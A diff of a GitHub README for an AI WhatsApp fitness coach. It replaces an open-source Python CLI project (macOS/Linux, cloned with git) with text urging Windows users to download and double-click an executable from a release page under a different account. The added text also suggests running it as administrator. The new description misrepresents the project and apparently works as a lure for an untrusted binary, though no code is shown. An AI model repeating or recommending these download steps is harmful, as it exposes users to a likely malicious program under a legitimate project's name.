@@ -1,255 +1,245 @@
-# AI Fitness Coach
+# 🏋️ ai-fitness-coach - Track fitness with smart WhatsApp coaching
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Python 3.12+](https://img.shields.io/badge/Python-3.12%2B-blue.svg)](https://www.python.org/downloads/)
-[![Built with Claude Code](https://img.shields.io/badge/Built%20with-Claude%20Code-blueviolet.svg)](https://docs.anthropic.com/en/docs/claude-code)
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Abigaelacrocarpous465/ai-fitness-coach/releases)
 
-**Your AI personal trainer that lives in WhatsApp.** Track workouts, nutrition, sleep, and weight -- then get smart suggestions, personalized reminders, and accountability, all through chat.
+## 📱 Overview
 
-> After setup, everything happens in WhatsApp. Change goals, set reminders, track food -- all through chat.
+ai-fitness-coach is an AI-powered WhatsApp fitness coach for daily use on Windows. It helps you track workouts, nutrition, sleep, and body weight in one place. It also sends reminders and gives simple, useful suggestions based on your logs.
 
----
+This app is built on Claude Code and is made for people who want a plain way to stay on track without opening a separate fitness app all day.
 
-## Features
+## ✨ What it does
 
-- **Soul System** -- Customize the coach's personality, tone, and behavior via a simple config file
-- **Voice Messages** -- Send voice notes in WhatsApp; transcribed via Whisper and understood by the coach
-- **Photo Recognition** -- Snap a photo of your meal; Claude Vision estimates calories and macros automatically
-- **Multi-Language** -- Works in any language you chat in (English, Chinese, Spanish, etc.)
-- **Smart Workout Suggestions** -- AI picks exercises based on what you haven't trained recently, adjusted for your sleep quality
-- **Nutrition Tracking** -- Log meals by description or photo; track calories, protein, carbs, and fat
-- **Sleep Tracking** -- Log sleep times and quality; affects workout intensity recommendations
-- **Progressive Overload** -- Track weight/sets/reps per exercise and see strength trends over time
-- **Cron Reminders** -- Automated WhatsApp messages that check your data and send context-aware nudges (morning and evening)
-- **Exercise Database** -- 70+ exercises categorized by muscle group and equipment type
+- Tracks workouts you complete during the day
+- Logs meals and basic nutrition
+- Records sleep and weight
+- Sends reminders for habits and check-ins
+- Gives smart suggestions based on your recent activity
+- Works through WhatsApp for a simple chat-style flow
+- Helps you keep a steady routine with less effort
 
----
+## 🪟 Windows requirements
 
-## How It Works
+Before you install, make sure your PC can run a modern desktop app:
 
-```mermaid
-flowchart LR
-    User["User\n(WhatsApp)"]
-    CC["Claude Code\n+ WhatsApp Plugin"]
-    CLI["fitness-cli.py"]
-    DB["SQLite DB\n(fitness.db)"]
-    Cron["Cron Jobs\n(reminders)"]
+- Windows 10 or Windows 11
+- Internet connection
+- WhatsApp account
+- Enough free disk space for the app and local data
+- Permission to run downloaded apps
+- A working browser to open the release page
 
-    User <-->|messages, photos, voice| CC
-    CC -->|runs commands| CLI
-    CLI <-->|read/write| DB
-    Cron -->|fetches status via CLI| DB
-    Cron -->|sends reminder via| CC
-```
+## ⬇️ Download the app
 
-1. You send a message to your WhatsApp group (text, photo, or voice)
-2. Claude Code (with the WhatsApp plugin) receives and interprets the message
-3. The coach personality (defined in your group config) processes it -- estimating macros, understanding workout reports, etc.
-4. `fitness-cli.py` logs data to or queries from the local SQLite database
-5. Claude formats the response into a friendly WhatsApp reply
-6. Cron jobs run twice daily, fetch your status, and send personalized reminders
+Visit this page to download the Windows release:
 
----
+https://github.com/Abigaelacrocarpous465/ai-fitness-coach/releases
 
-## Quick Start
+## 🛠️ Install on Windows
 
-### 1. Install Claude Code
+1. Open the release page link above
+2. Find the latest release near the top of the page
+3. Look for a Windows file in the Assets section
+4. Download the file to your computer
+5. Open your Downloads folder
+6. Double-click the downloaded file
+7. If Windows asks for permission, choose Run or Yes
+8. Follow the setup window
+9. Finish the install
+10. Open ai-fitness-coach from the Start menu or desktop shortcut
 
-```bash
-npm install -g @anthropic-ai/claude-code
-claude --version
-```
+If the file comes as a zip folder:
 
-### 2. Install the WhatsApp Plugin
+1. Right-click the zip file
+2. Choose Extract All
+3. Open the extracted folder
+4. Start the app file inside the folder
 
-> **Plugin repo:** [Rich627/whatsapp-claude-plugin](https://github.com/Rich627/whatsapp-claude-plugin) — WhatsApp channel plugin for Claude Code
+## 🚀 First-time setup
 
-```bash
-# Inside a Claude Code session:
-/plugin install whatsapp@whatsapp-claude-plugin
-```
+After you open the app for the first time, complete these steps:
 
-### 3. Clone and Set Up
+1. Sign in or connect your WhatsApp account if the app asks for it
+2. Allow access to notifications if prompted
+3. Set your time zone
+4. Choose your daily reminder times
+5. Add your main fitness goal
+6. Pick the type of tracking you want to use
+7. Save your settings
 
-```bash
-git clone https://github.com/moltbot0912/ai-fitness-coach.git
-cd ai-fitness-coach
-chmod +x setup.sh
-./setup.sh
-```
+Use short goal names like these:
 
-### 4. Start Chatting
+- Lose weight
+- Build muscle
+- Improve sleep
+- Stay active
+- Track meals
 
-```bash
-claude --channels plugin:whatsapp@whatsapp-claude-plugin
-```
+## 💬 How to use it
 
-Send a message in your WhatsApp group and the coach will respond. For detailed setup instructions, see [docs/SETUP.md](docs/SETUP.md) and [docs/CLAUDE_CODE_SETUP.md](docs/CLAUDE_CODE_SETUP.md).
+Use simple messages in WhatsApp. The coach reads your entries and stores them for later use.
 
----
+You can send things like:
 
-## Demo
+- Workout: 30 min walk
+- Meal: chicken, rice, salad
+- Sleep: 7 hours
+- Weight: 74 kg
+- Reminder: evening check-in
 
-Here is what a typical interaction looks like in your WhatsApp group:
+The coach can help you:
 
-### Daily Status Check
+- Log a workout after a gym session
+- Keep track of meals during the day
+- Watch your sleep patterns
+- Follow your weight trend
+- Remind you when it is time to check in
 
-> "Hey Coach, what's my status?" -- Get a complete daily snapshot with weight, workout, sleep, and nutrition at a glance.
+## 🧩 Common commands and entries
 
-<p align="center">
-  <img src="assets/demo/01-status.jpg" alt="Daily status check showing weight, workout, sleep, and nutrition summary" width="300">
-</p>
+You do not need to learn special commands, but these message styles work well:
 
-### Food Photo Recognition
+### Workout log
+- Workout: chest day
+- Workout: 20 min run
+- Workout: leg workout, 45 min
 
-> Snap a photo of your meal and the coach instantly analyzes calories and macros, updates your daily totals, and tells you how much more you need to eat.
+### Nutrition log
+- Meal: eggs and toast
+- Meal: pasta with chicken
+- Snack: apple and yogurt
 
-<p align="center">
-  <img src="assets/demo/02-food.jpg" alt="Food photo analysis with automatic nutrition breakdown" width="300">
-  <img src="assets/demo/04-workout.jpg" alt="AI-generated workout plan based on sleep, recovery, and equipment" width="300">
-</p>
+### Sleep log
+- Sleep: 8 hours
+- Sleep: late night, 6.5 hours
 
-### Weight Tracking & Smart Workout Plan
+### Weight log
+- Weight: 72 kg
+- Weight: 159 lb
 
-> Log your weight to see your progress trend, then ask what to train — the AI builds a personalized plan based on sleep quality, training history, and available equipment.
+### Reminder ideas
+- Remind me to drink water
+- Remind me to check in at 8 pm
+- Remind me to log dinner
 
-<p align="center">
-  <img src="assets/demo/04-workout.jpg" alt="AI-generated workout plan based on sleep, recovery, and equipment" width="300">
-  <img src="assets/demo/03-weight.jpg" alt="Weight logging with trend display and goal tracking" width="300">
-</p>
+## 🔧 Settings you may want to change
 
-### Gym Equipment Recognition & Usage Guide
+The app may include basic settings for:
 
-> Snap a photo of any gym machine — the coach identifies it and teaches you step-by-step how to use it with proper form and safety tips.
+- Reminder time
+- Units for weight
+- Daily check-in frequency
+- Goal focus
+- Message style
+- Sleep and workout tracking options
 
-<p align="center">
-  <img src="assets/demo/05-equipment.jpg" alt="Gym equipment photo identification" width="300">
-  <img src="assets/demo/07-maps.jpg" alt="Detailed step-by-step usage instructions with form tips" width="300">
-</p>
+If you plan to use the app each day, set the reminder time to match your normal routine. That makes the coach easier to use.
 
-### Restaurant Recommendations & Navigation
+## 📊 What you can track
 
-> "Any restaurant recommendations?" -- Get suggestions based on your remaining nutrition targets, find the nearest location on Google Maps, and get an optimized order.
+### Workouts
+Track gym sessions, cardio, walking, and home workouts.
 
-<p align="center">
-  <img src="assets/demo/07-maps.jpg" alt="User asking for restaurant recommendations" width="300">
-  <img src="assets/demo/06-restaurant.jpg" alt="Restaurant recommendations based on remaining daily nutrition targets" width="300">
-  <img src="assets/demo/09-extra.jpg" alt="Nearest restaurant with Google Maps link and directions" width="300">
-  <img src="assets/demo/08-order.jpg" alt="Optimized order suggestion with macro breakdown and dietary notes" width="300">
-</p>
+### Nutrition
+Log meals, snacks, and drinks so you can spot patterns in your intake.
 
----
+### Sleep
+Add sleep duration and sleep quality to see how rest affects your progress.
 
-## FAQ
+### Weight
+Record body weight over time to follow trends.
 
-### Do I need a paid API key?
+### Habits
+Use reminders for water, steps, meals, and daily check-ins.
 
-Yes. Claude Code requires an Anthropic API subscription or a Claude Pro/Team plan. The AI Fitness Coach project itself is free and open source, but the underlying Claude Code CLI requires authentication and API credits.
+## 🧠 Smart suggestions
 
-### Can I use this without WhatsApp?
+ai-fitness-coach can use your recent logs to suggest small next steps, such as:
 
-Yes. The CLI (`fitness-cli.py`) works entirely standalone. You can log food, workouts, sleep, and weight directly from the terminal. The WhatsApp integration is optional and adds the conversational interface and automated reminders.
+- Try a lighter dinner after a late workout
+- Get more sleep before a hard training day
+- Keep meal timing more even
+- Add a short walk after meals
+- Log weight at the same time each morning
 
-### Where is my data stored?
+These suggestions keep the app useful without adding extra work.
 
-All data is stored locally in a SQLite database file (`data/fitness.db`). Nothing is sent to external servers beyond the Claude API calls for generating responses. Your fitness data stays on your machine.
+## 🗂️ Example daily flow
 
-### How accurate are the AI macro estimates?
+1. Morning: log your weight
+2. Midday: log lunch
+3. Afternoon: record your workout
+4. Evening: log dinner and sleep time
+5. The coach sends a reminder if you miss a check-in
 
-The coach uses Claude's general knowledge to estimate macros from food descriptions and photos. The estimates are reasonable approximations but not lab-precise. For more accuracy, provide specific quantities (e.g., "200g chicken breast" instead of "some chicken"). You can always override by providing exact macro values.
+## ❓ Help with common problems
 
-### How do I back up my data?
+### The app does not open
+- Download it again from the release page
+- Make sure the file finished downloading
+- Try running it as an administrator
+- Check that Windows did not block the file
 
-Copy the `data/fitness.db` file. That single file contains all your workouts, nutrition logs, weight history, and sleep data. See [docs/AWS_SETUP.md](docs/AWS_SETUP.md) for automated backup instructions.
+### WhatsApp does not connect
+- Check your internet connection
+- Make sure your WhatsApp account is active
+- Close the app and open it again
+- Review the setup steps
 
-### Can multiple people use the same instance?
+### Reminders do not appear
+- Turn on notifications in Windows
+- Check the reminder time in settings
+- Make sure the app is still running
+- Confirm that your time zone is correct
 
-Currently, the system is designed for a single user per installation. Each person should have their own profile and database. Multiple people in the same WhatsApp group will share a single bot, but data tracking is per-installation.
+### Entries do not seem to save
+- Send one short test message
+- Check that your message format is simple
+- Restart the app
+- Try again after a few seconds
 
----
+## 🧾 Release page
 
-## Limitations and Warnings
+Use this page to download the latest Windows build:
 
-Before using AI Fitness Coach, please be aware of the following:
+https://github.com/Abigaelacrocarpous465/ai-fitness-coach/releases
 
-- **Requires Anthropic API key** -- Claude Code requires an active Claude Pro, Team, or Enterprise subscription, or API credits. This is a recurring cost.
-- **Requires an always-on machine** -- For WhatsApp integration and cron reminders, you need a machine that stays running (your computer or a cloud VM at ~$3-5/month). See [docs/AWS_SETUP.md](docs/AWS_SETUP.md).
-- **WhatsApp linked device limitations** -- The WhatsApp plugin links as an additional device to your account. WhatsApp allows a limited number of linked devices, and the link may need to be re-established periodically.
-- **Nutrition estimates are approximations** -- AI-generated calorie and macro estimates are based on general knowledge, not certified nutritional databases. They are useful for tracking trends but should not be treated as exact values.
-- **Not a substitute for professional advice** -- This tool is not a replacement for professional medical, nutritional, or fitness advice. Consult a qualified professional before starting any new exercise or diet program.
-- **Voice transcription accuracy varies** -- Voice message transcription (via Whisper) works best in quiet environments. Background noise, accents, and uncommon terminology may reduce accuracy.
+## 🧭 Project topics
 
----
+- ai
+- chatbot
+- claude-code
+- fitness
+- health
+- nutrition
+- open-source
+- personal-trainer
+- whatsapp
+- workout-tracker
 
-## Supported Platforms
+## 📌 File location after download
 
-| Platform | Status |
-|---|---|
-| **macOS** | Fully supported |
-| **Linux** (Ubuntu/Debian) | Fully supported |
+After you download the app, Windows usually saves it in:
 
----
+- Downloads folder
+- Desktop, if you chose that location
+- A folder you picked during download
 
-## For Developers
+If you extract a zip file, keep the app in its own folder so it can store its files in one place.
 
-### Architecture
+## 🔐 Safe use on Windows
 
-The system is built around a Python CLI (`fitness-cli.py`) backed by a SQLite database, orchestrated by Claude Code with a WhatsApp channel plugin. The coach personality is defined in a group config file (the "soul" system).
+- Download only from the release page
+- Check the file name before opening it
+- Use the latest release when possible
+- Keep Windows updated
+- Use one account for your own tracking data
 
-For the full architecture overview, component details, database schema, and data flow diagrams, see [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md).
+## 🏁 Start using the coach
 
-### CLI Reference
-
-All fitness operations are exposed via `python3 src/fitness-cli.py <command>`. Commands include logging (food, weight, workouts, sleep, exercises), querying (status, summaries, trends), and smart features (workout suggestions, weekly plans, strength trends).
-
-For the full command reference with arguments and example output, see [docs/COMMANDS.md](docs/COMMANDS.md).
-
-### Development Setup
-
-```bash
-# Clone and set up
-git clone https://github.com/moltbot0912/ai-fitness-coach.git
-cd ai-fitness-coach
-./setup.sh
-
-# Run the CLI
-python3 src/fitness-cli.py --help
-
-# Run tests
-python3 -m pytest tests/
-```
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for code conventions, contribution guidelines, and ideas for new features.
-
-### Project Structure
-
-```
-ai-fitness-coach/
-  src/
-    fitness-cli.py             # Main CLI for all fitness operations
-    db_manager.py              # SQLite database layer
-    exercises.md               # Exercise database (70+ exercises)
-  config/
-    .env.example               # Environment variable template
-    profile.example.json       # User profile template
-    group-config.example.md    # WhatsApp group personality template
-  cron/
-    workout-reminder.sh        # Automated WhatsApp reminder script
-    install-cron.sh            # Cron job installer
-  docs/
-    ARCHITECTURE.md            # System architecture overview
-    AWS_SETUP.md               # Cloud deployment guide
-    COMMANDS.md                # CLI command reference
-    SETUP.md                   # General setup guide
-    CLAUDE_CODE_SETUP.md       # Claude Code + WhatsApp plugin guide
-  data/                        # SQLite database (git-ignored)
-  setup.sh                     # One-click setup script
-  CONTRIBUTING.md              # Contribution guidelines
-  LICENSE                      # MIT License
-```
-
----
-
-## License
-
-MIT License. See [LICENSE](LICENSE).
+1. Download the app from the release page
+2. Install or extract it
+3. Open the app
+4. Connect WhatsApp
+5. Set your reminders
+6. Send your first workout, meal, sleep, or weight log
